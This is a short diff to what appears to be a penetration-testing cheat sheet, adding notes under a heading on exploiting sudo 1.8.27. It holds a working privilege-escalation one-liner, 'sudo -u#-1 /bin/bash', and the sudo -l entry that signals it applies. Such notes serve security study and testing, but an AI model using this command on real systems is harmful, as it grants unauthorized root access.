@@ -401,7 +401,11 @@ https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guid
 
 ### [exploiting sudo 1.8.27]
 https://www.exploit-db.com/exploits/47502
+
 ```
+things to look for in sudo -l
+(ALL, !root) /bin/bash
+
 sudo -u#-1 /bin/bash
 ```
 
